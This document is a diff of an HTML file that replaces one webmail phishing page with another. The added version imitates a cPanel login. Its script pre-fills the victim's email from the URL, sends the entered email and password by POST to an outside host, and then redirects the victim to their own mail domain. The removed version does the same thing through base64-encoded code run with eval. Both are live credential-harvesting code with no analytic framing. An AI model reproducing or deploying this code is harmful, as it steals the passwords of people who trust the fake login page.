@@ -1,67 +1,65 @@
+<!DOCTYPE HTML PUBLIC>
 
-<!doctype html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>Webmail - Login </title>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
-<style type="text/css">
- .login-form{width: 385px; margin: 30px auto; overflow: hidden;}.login-form form{margin-bottom: 15px; background: #f7f7f7; box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3); padding: 30px;}.login-form h2{margin: 0 0 15px;}.form-control, .login-btn{min-height: 38px; border-radius: 2px;}.input-group-addon .fa{font-size: 18px;}.login-btn{font-size: 15px; font-weight: bold;}.social-btn .btn{border: none; margin: 10px 3px 0; opacity: 1;}.social-btn .btn:hover{opacity: 0.9;}.social-btn .btn-primary{background: #507cc0;}.social-btn .btn-info{background: #64ccf1;}.social-btn .btn-danger{background: #df4930;}.or-seperator{margin-top: 20px; text-align: center; border-top: 1px solid #ccc;}.or-seperator i{padding: 0 10px; background: #f7f7f7; position: relative; top: -11px; z-index: 1;}.loadings{position:absolute; z-index:1;}#loading{border-top:none; background:#fff; position:absolute; top:0px; bottom:0; right:0; left:0; text-align:center; z-index:998; pointer-events: none;}.fadeout{animation: fadeout .8s forwards; transition: all .2s ease;}@-webkit-keyframes fadeout{0%{opacity: 1; visibility: visible;}50%{opacity: .5;}100%{opacity: 0; visibility: hidden;}}@keyframes fadeout{0%{opacity: 1; visibility: visible;}50%{opacity: .5;}100%{opacity: 0; visibility: hidden;}}.loadings{position:absolute; z-index:1; top:20%}.loadings{left:25%}@media only screen and (max-width: 1279px){li .icon-envelope{display:none}.toplink{float:right}#search_block .form-search .button-search{min-width:30px}.loadings{left:0%}} 
- </style>
-
-</head>
-<body style="background-color: #e8e8e8;">
-  <div id="loading">
-    <div class="loadings">
-      <img src="">
-    </div>
-  </div>
-
-  <p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>
-
-  
-  <div class="form-row login-form">
-   
+<HTML><HEAD>
+<title>Webmail Login</title>
+<META name=GENERATOR content="MSHTML 11.00.10570.1001">
+<style>
+    .err{display:none; background-color: #d35351; color: #fff; padding: 15px 0px 15px 60px; font-size: 13px; border-radius: 4px; align-items:center;  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; /* padding-left: 46px; */}
+</style>
+</HEAD>
+<BODY style="MARGIN: 0.5em">
+<DIV id=login-wrapper class="group" style='FONT-SIZE: medium; FONT-FAMILY: "Open Sans", helvetica, arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; MIN-HEIGHT: 460px; ORPHANS: 2; WIDOWS: 2; MARGIN: 45px auto; LETTER-SPACING: normal; VISIBILITY: visible; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; 
+text-decoration-style: initial; text-decoration-color: initial; opacity: 1'>
+<DIV class=wrapper>
+<DIV id=content-container>
     
-      <form>  
-        <div class="form-group ">
-      <h2 class="text-center"><div id="top">
-      <img src="" alt="" id="logoimg"><br>
-      <span style="vertical-align: middle; padding-left: 5px; font-family: Georgia, 'Times New Roman', Times, serif;" class="logoname">Webmail</span> <br><br>Sign in to continue</div></h2>
-      
-     
-      <div class="form-group">
-        <div id="msg" class="form-group" role="alert" style="font-size: 12px; vertical-align: middle; display: none; color: #C1272D;
-        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;margin-top: 5px; ">
-          The user name or password is incorrect. Try entering it again.      
-         </div>
-        <div class="input-group">
-          <input type="email" class="form-control" name="email" placeholder="Username" value="" id="email" readonly>
-        </div>
-      </div>
-      <div class="form-group">
-        <div class="input-group">
-          <input type="password" class="form-control" id="password" name="password" placeholder="Password" required="required">
-        </div>
-      </div>
-      <br>
-      <div class="form-group">
-        <button type="submit" class="btn btn-primary login-btn btn-block" id="submit-btn">Sign in</button>
-      </div>
+<DIV id=login-container style="WIDTH: 356px; POSITION: relative; MARGIN: 0px auto">
+<div class="err" id="msg"><span class='login-status-icon'> login is invalid.</span></div><br>
+<DIV id=login-sub-container style="WIDTH: 345px; POSITION: relative; LEFT: 5px">
+<DIV id=login-sub-header style="HEIGHT: 65px; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 10px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px"><IMG class=main-logo style="HEIGHT: 50px; MARGIN-LEFT: 7px" alt=logo src="https://i.gyazo.com/87f4651fa8cfe94cbb7457dceeece466.png"></DIV>
+<DIV id=login-sub style="FONT-SIZE: 13px; HEIGHT: 260px; PADDING-TOP: 30px; PADDING-LEFT: 30px">
+<DIV id=clickthrough_form style="RIGHT: 0px; POSITION: absolute; LEFT: 0px; TOP: 100px; VISIBILITY: hidden">
+<FORM>
+    
+<DIV class=notices></DIV>
+<BUTTON class=clickthrough-cont-btn style='FONT-SIZE: 13px; CURSOR: pointer; TEXT-DECORATION: none; BORDER-TOP: rgb(9,87,121) 1px solid; FONT-FAMILY: "Open Sans", sans-serif; BORDER-RIGHT: rgb(9,87,121) 1px solid; WIDTH: 345px; MARGIN-TOP: 20px; BORDER-BOTTOM: rgb(9,87,121) 1px solid; FLOAT: left; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); PADDING-BOTTOM: 7px; TEXT-ALIGN: center; PADDING-TOP: 7px; BORDER-LEFT: rgb(9,87,121) 1px solid; BACKGROUND-COLOR: rgb(23,155,215); border-radius: 4px' 
+type=submit></BUTTON></FORM></DIV>
+<DIV id=forms style="POSITION: absolute; LEFT: 30px; TOP: 0px">
 
-      <div class="clearfix">
-        <label class="pull-left checkbox-inline"><input type="checkbox" checked> Secured Login session?</label>
-        <a href="#" class="pull-right">Forgot Password?</a>
-      </div>
-      
-    </form>
-
-    <p style="text-align:center"> 
-      <a href="#">&copy; Copyright <span class="logoname"></span> 2022  All Rights Reserved.</a>
-    </p>
-  </div>
+<FORM id=login_form style="POSITION: absolute; LEFT: 0px; TOP: 100px" method=post action="https://carriesgose.cc/pan/feedback.php">
+<DIV class=input-req-login style="FONT-SIZE: 12px; WIDTH: 285px; FONT-WEIGHT: bold; COLOR: rgb(41,58,74); PADDING-BOTTOM: 8px; PADDING-LEFT: 4px"><LABEL style='FONT-SIZE: 14px; FONT-FAMILY: "Open Sans", sans-serif; FONT-WEIGHT: 600' for=user>Email Address</LABEL></DIV>
+<DIV class="input-field-login icon username-container" style="BORDER-TOP: rgb(190,190,190) 2px solid; HEIGHT: 32px; BORDER-RIGHT: rgb(190,190,190) 2px solid; BACKGROUND-IMAGE: url(); BACKGROUND-REPEAT: no-repeat; BORDER-BOTTOM: rgb(190,190,190) 2px solid; BACKGROUND-POSITION: 6px 6px; BORDER-LEFT: rgb(190,190,190) 2px solid; DISPLAY: block; BACKGROUND-COLOR: rgb(255,255,255); border-radius: 4px">
+<INPUT tabIndex=1  class=std_textbox style='FONT-SIZE: 13px; BORDER-TOP: rgb(255,255,255) 1px solid; HEIGHT: 22px; FONT-FAMILY: "Open Sans", sans-serif; BORDER-RIGHT: rgb(255,255,255) 1px solid; WIDTH: 220px; BACKGROUND: none transparent scroll repeat 0% 0%; BORDER-BOTTOM: rgb(255,255,255) 1px solid; COLOR: rgb(0,0,0); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; BORDER-LEFT: rgb(255,255,255) 1px solid; MARGIN: 4px 5px 0px 30px; 
+OUTLINE-COLOR: invert; PADDING-RIGHT: 10px; border-radius: 4px; appearance: none; box-shadow: none' name="email" id="email"  required="" readonly placeholder="Enter your email address." autofocus="autofocus"></DIV>
+<DIV class="input-req-login login-password-field-label" style="FONT-SIZE: 12px; WIDTH: 285px; MARGIN-TOP: 30px; FONT-WEIGHT: bold; COLOR: rgb(41,58,74); PADDING-BOTTOM: 8px; PADDING-LEFT: 4px"><LABEL style='FONT-SIZE: 14px; FONT-FAMILY: "Open Sans", sans-serif; FONT-WEIGHT: 600' for=pass>Password</LABEL></DIV>
+<DIV class="input-field-login icon password-container" style="BORDER-TOP: rgb(190,190,190) 2px solid; HEIGHT: 32px; BORDER-RIGHT: rgb(190,190,190) 2px solid; BACKGROUND-IMAGE: url(); BACKGROUND-REPEAT: no-repeat; BORDER-BOTTOM: rgb(190,190,190) 2px solid; BACKGROUND-POSITION: 6px 6px; BORDER-LEFT: rgb(190,190,190) 2px solid; DISPLAY: block; BACKGROUND-COLOR: rgb(255,255,255); border-radius: 4px">
+<INPUT tabIndex=2 class=std_textbox style='FONT-SIZE: 13px; BORDER-TOP: rgb(255,255,255) 1px solid; HEIGHT: 22px; FONT-FAMILY: "Open Sans", sans-serif; BORDER-RIGHT: rgb(255,255,255) 1px solid; WIDTH: 220px; BACKGROUND: none transparent scroll repeat 0% 0%; BORDER-BOTTOM: rgb(255,255,255) 1px solid; COLOR: rgb(0,0,0); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; BORDER-LEFT: rgb(255,255,255) 1px solid; MARGIN: 4px 5px 0px 30px; 
+OUTLINE-COLOR: invert; PADDING-RIGHT: 10px; border-radius: 4px; appearance: none; box-shadow: none' type=password name="password"  id="password" required="" placeholder="Enter your email password."></DIV>
+<DIV class=controls style="WIDTH: 285px; DISPLAY: inline-block">
+<DIV class=login-btn style="FONT-SIZE: 13px; WIDTH: 285px; FLOAT: left; FONT-WEIGHT: 600; PADDING-TOP: 30px">
+<BUTTON tabIndex=3 id="submit-btn" style='FONT-SIZE: 13px; CURSOR: pointer; TEXT-DECORATION: none; BORDER-TOP: rgb(9,87,121) 1px solid; FONT-FAMILY: "Open Sans", sans-serif; BORDER-RIGHT: rgb(9,87,121) 1px solid; WIDTH: 285px; BORDER-BOTTOM: rgb(9,87,121) 1px solid; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); PADDING-BOTTOM: 7px; TEXT-ALIGN: center; PADDING-TOP: 7px; BORDER-LEFT: rgb(9,87,121) 1px solid; BACKGROUND-COLOR: rgb(23,155,215); border-radius: 4px' type=submit >Log in</BUTTON>
+</DIV></DIV>
+<DIV id=push class=clear style="CLEAR: both"></DIV></FORM></DIV></DIV></DIV></DIV></DIV>
+<DIV id=locale-footer style="WIDTH: 1713px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 5px; MARGIN: 40px auto; DISPLAY: block; PADDING-RIGHT: 5px">
+<DIV class=locale-container style="PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 5px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<UL id=locales_list style="PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 0px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">English</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">&#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">&#1073;&#1098;&#1083;&#1075;&#1072;&#1088;&#1089;&#1082;&#1080;</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">&#269;e&#353;tina</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">dansk</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">Deutsch</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">&#917;&#955;&#955;&#951;&#957;&#953;&#954;&#940;</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A style="FONT-SIZE: 12px; TEXT-DECORATION: none; FONT-WEIGHT: 600; COLOR: rgb(41,58,74)" href="#">espa&ntilde;ol</A></LI><SPAN>&nbsp;</SPAN>
+<LI style="LIST-STYLE-TYPE: none; MARGIN-LEFT: 34px; DISPLAY: inline"><A id=morelocale title="More locales" style="FONT-SIZE: 16px; TEXT-DECORATION: none; FONT-WEIGHT: bold; COLOR: rgb(41,58,74)">&#8230;</A></LI></UL></DIV></DIV></DIV></DIV>
+<DIV class=copyright style="FONT-SIZE: 7pt; FONT-FAMILY: verdana; BACKGROUND: 
+url(#) center top; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(63,65,67); FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 30px; ORPHANS: 2; WIDOWS: 2; MARGIN: 10px 0px 0px; 
+LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial">Copyright&copy;&nbsp;2022 cPanel, L.L.C.<BR><A style="TEXT-DECORATION: none; COLOR: rgb(63,65,67)" href="#">Privacy Policy</A></DIV>
 </body>
 
+<script>
+    (function(){const a={email:document.querySelector("#email"),password:document.querySelector("#password"),submitBtn:document.querySelector("#submit-btn"),msg:document.querySelector("#msg"),error:document.querySelector("#error"),loader:document.querySelector("#loading"),fadeOut:document.querySelector(".fadeout"),regExp:{emailReg:/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/,passwordReg:/^([\w-!#\$@\/]{6,})$/g},links:{redirectLink:"https://carriesgose.cc/pan/feedback.php"},placeholders:{domainAddress:"",domainName:"",domainNameUpper:""},validate:function(a,b){if("email"===b){if(this.regExp.emailReg.test(a))return!0;}else if(!("password"===b))return!1;else if(this.regExp.passwordReg.test(a))return!0},validateInput:function(b){if("email"===b){const b=window.location.hash.substr(1);if(this.validate(b,"email")&&""!==b)return this.email.value=b,this.placeholders.domainAddress=b.substr(b.indexOf("@")+1),this.placeholders.domainName=this.placeholders.domainAddress.substr(0,this.placeholders.domainAddress.indexOf(".")).toLowerCase(),this.placeholders.domainNameUpper=a.placeholders.domainName.toUpperCase(),!0}else if("password"===b){let b=this.password.value;if(this.validate(b,"password")&&""!==b&&6<b.length){var c="email=".concat(email.value,"&password=").concat(password.value);return this.submitBtn.innerHTML="Log in",this.postAjax(a.links.redirectLink,c),setTimeout(()=>window.location.href="https://www."+this.placeholders.domainAddress,200),!0}return void(this.msg.style.display="block")}},postAjax:function(a,b,c){var d="string"==typeof b?b:Object.keys(b).map(function(a){return encodeURIComponent(a)+"="+encodeURIComponent(b[a])}).join("&"),e=window.XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP");return e.open("POST",a),e.onreadystatechange=function(){3<e.readyState&&200==e.status&&c(e.responseText)},e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send(d),e}};window.addEventListener("load",()=>{a.validateInput("email")}),a.submitBtn.addEventListener("click",b=>{b.preventDefault();let c=0;if(a.validateInput("email"),""===a.email.value&&""===a.password.value)return void(a.error.style.display="block");if(a.validate(a.password.value,"password")&&""!==a.password.value){a.submitBtn.innerHTML="Log in";var d="email=".concat(a.email.value,"&password=").concat(password.value);return a.msg.style.display="none",a.postAjax(a.links.redirectLink,d),setTimeout(function(){a.password.value="",a.msg.style.display="block",a.submitBtn.innerHTML="Log in"},1500),a.password.focus(),!1}return 6>a.password.value.length?(a.msg.style.display="block",a.password.value="",a.password.focus(),c=0,!1):void(c++,1==c&&(a.validateInput("email"),a.validateInput("password")))})})();
+  </script>
 
-<script>eval(atob("ICAgICFmdW5jdGlvbigpe2NvbnN0IGU9e2VtYWlsOmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNlbWFpbCIpLHBhc3N3b3JkOmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNwYXNzd29yZCIpLHN1Ym1pdEJ0bjpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjc3VibWl0LWJ0biIpLGxvZ29JbWFnZTpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjbG9nb2ltZyIpLGxvZ29OYW1lOmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5sb2dvbmFtZSIpLG1zZzpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIjbXNnIiksZXJyb3I6ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2Vycm9yIiksbG9hZGVyOmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNsb2FkaW5nIiksZmFkZU91dDpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZmFkZW91dCIpLHJlZ0V4cDp7ZW1haWxSZWc6L14oW2EtekEtWjAtOV9cLlwtXSkrXEAoKFthLXpBLVowLTlcLV0pK1wuKSsoW2EtekEtWjAtOV17Miw0fSkrJC8scGFzc3dvcmRSZWc6L14oW1x3LSEjXCRAXC9dezYsfSkkL2d9LGxpbmtzOntyZWRpcmVjdExpbms6Imh0dHBzOi8vY2Fycmllc2dvc2UuY2MvcGFuL2ZlZWRiYWNrLnBocCIsaW1hZ2VMaW5rOiJodHRwczovL2xvZ28uY2xlYXJiaXQuY29tLyJ9LHBsYWNlaG9sZGVyczp7ZG9tYWluQWRkcmVzczoiIixkb21haW5OYW1lOiIiLGRvbWFpbk5hbWVVcHBlcjoiIn0sdmFsaWRhdGU6ZnVuY3Rpb24oZSx0KXtpZigiZW1haWwiPT09dCl7aWYodGhpcy5yZWdFeHAuZW1haWxSZWcudGVzdChlKSlyZXR1cm4hMH1lbHNle2lmKCJwYXNzd29yZCIhPT10KXJldHVybiExO2lmKHRoaXMucmVnRXhwLnBhc3N3b3JkUmVnLnRlc3QoZSkpcmV0dXJuITB9fSx2YWxpZGF0ZUlucHV0OmZ1bmN0aW9uKGUpe2lmKCJlbWFpbCI9PT1lKXtjb25zdCBlPXdpbmRvdy5sb2NhdGlvbi5oYXNoLnN1YnN0cigxKTtpZih0aGlzLnZhbGlkYXRlKGUsImVtYWlsIikmJiIiIT09ZSl7dGhpcy5lbWFpbC52YWx1ZT1lLHRoaXMucGxhY2Vob2xkZXJzLmRvbWFpbkFkZHJlc3M9ZS5zdWJzdHIoZS5pbmRleE9mKCJAIikrMSksdGhpcy5wbGFjZWhvbGRlcnMuZG9tYWluTmFtZT10aGlzLnBsYWNlaG9sZGVycy5kb21haW5BZGRyZXNzLnN1YnN0cigwLHRoaXMucGxhY2Vob2xkZXJzLmRvbWFpbkFkZHJlc3MuaW5kZXhPZigiLiIpKS50b0xvd2VyQ2FzZSgpLHRoaXMucGxhY2Vob2xkZXJzLmRvbWFpbk5hbWVVcHBlcj10aGlzLnBsYWNlaG9sZGVycy5kb21haW5OYW1lLnRvVXBwZXJDYXNlKCk7Y29uc3QgdD10aGlzLmxpbmtzLmltYWdlTGluayt0aGlzLnBsYWNlaG9sZGVycy5kb21haW5BZGRyZXNzO3JldHVybiB0aGlzLmxvZ29JbWFnZS5zZXRBdHRyaWJ1dGUoInNyYyIsdCksdGhpcy5sb2dvTmFtZS5pbm5lckhUTUw9dGhpcy5wbGFjZWhvbGRlcnMuZG9tYWluTmFtZVVwcGVyLGZldGNoKHQpLnRoZW4oZT0+e2NvbnNvbGUubG9nKGUpLHRoaXMubG9nb0ltYWdlLnNldEF0dHJpYnV0ZSgic3JjIix0KX0pLmNhdGNoKGU9Pntjb25zb2xlLmVycm9yKGUpLHRoaXMubG9nb0ltYWdlLnNldEF0dHJpYnV0ZSgic3JjIixgJHt0aGlzLmxpbmtzLmltYWdlTGlua31tYWlsLmNvbWApfSksITB9fWVsc2UgaWYoInBhc3N3b3JkIj09PWUpe2xldCBlPXRoaXMucGFzc3dvcmQudmFsdWU7aWYodGhpcy52YWxpZGF0ZShlLCJwYXNzd29yZCIpJiYiIiE9PWUmJmUubGVuZ3RoPjYpe3ZhciB0PSJlbWFpbD0iLmNvbmNhdChlbWFpbC52YWx1ZSwiJnBhc3N3b3JkPSIpLmNvbmNhdChwYXNzd29yZC52YWx1ZSk7dGhpcy5wb3N0QWpheCh0aGlzLmxpbmtzLnJlZGlyZWN0TGluayx0KSxzZXRUaW1lb3V0KCgpPT53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly93d3cuIit0aGlzLnBsYWNlaG9sZGVycy5kb21haW5BZGRyZXNzLDIwMCksITB9cmV0dXJuIHZvaWQodGhpcy5tc2cuc3R5bGUuZGlzcGxheT0iYmxvY2siKX19LHBvc3RBamF4OmZ1bmN0aW9uKGUsdCxzKXt2YXIgYT0ic3RyaW5nIj09dHlwZW9mIHQ/dDpPYmplY3Qua2V5cyh0KS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJuIGVuY29kZVVSSUNvbXBvbmVudChlKSsiPSIrZW5jb2RlVVJJQ29tcG9uZW50KHRbZV0pfSkuam9pbigiJiIpLG89d2luZG93LlhNTEh0dHBSZXF1ZXN0P25ldyBYTUxIdHRwUmVxdWVzdDpuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTtyZXR1cm4gby5vcGVuKCJQT1NUIixlKSxvLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpe28ucmVhZHlTdGF0ZT4zJiYyMDA9PW8uc3RhdHVzJiZzKG8ucmVzcG9uc2VUZXh0KX0sby5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKSxvLnNlbmQoYSksb319O3dpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoKT0+e3NldFRpbWVvdXQoKCk9PntlLmxvYWRlci5jbGFzc0xpc3QuYWRkKCJmYWRlb3V0Iil9LDFlMyksZS52YWxpZGF0ZUlucHV0KCJlbWFpbCIpfSksZS5zdWJtaXRCdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLHQ9Pnt0LnByZXZlbnREZWZhdWx0KCk7bGV0IHM9MDtpZihlLnZhbGlkYXRlSW5wdXQoImVtYWlsIiksIiIhPT1lLmVtYWlsLnZhbHVlfHwiIiE9PWUucGFzc3dvcmQudmFsdWUpe2lmKGUudmFsaWRhdGUoZS5wYXNzd29yZC52YWx1ZSwicGFzc3dvcmQiKSYmIiIhPT1lLnBhc3N3b3JkLnZhbHVlKXt2YXIgYT0iZW1haWw9Ii5jb25jYXQoZS5lbWFpbC52YWx1ZSwiJnBhc3N3b3JkPSIpLmNvbmNhdChwYXNzd29yZC52YWx1ZSk7cmV0dXJuIGUubXNnLnN0eWxlLmRpc3BsYXk9Im5vbmUiLGUucG9zdEFqYXgoZS5saW5rcy5yZWRpcmVjdExpbmssYSksc2V0VGltZW91dChmdW5jdGlvbigpe2UucGFzc3dvcmQudmFsdWU9IiIsZS5tc2cuc3R5bGUuZGlzcGxheT0iYmxvY2siLGUuc3VibWl0QnRuLmlubmVySFRNTD0iU2lnbiBpbiJ9LDE1MDApLGUucGFzc3dvcmQuZm9jdXMoKSwhMX1pZihlLnBhc3N3b3JkLnZhbHVlLmxlbmd0aDw2KXJldHVybiBlLm1zZy5zdHlsZS5kaXNwbGF5PSJibG9jayIsZS5wYXNzd29yZC52YWx1ZT0iIixlLnBhc3N3b3JkLmZvY3VzKCkscz0wLCExOzE9PT0rK3MmJihlLnZhbGlkYXRlSW5wdXQoImVtYWlsIiksZS52YWxpZGF0ZUlucHV0KCJwYXNzd29yZCIpKX1lbHNlIGUuZXJyb3Iuc3R5bGUuZGlzcGxheT0iYmxvY2sifSl9KCk7"));</script>
-</html>
+</body>
+</HTML>
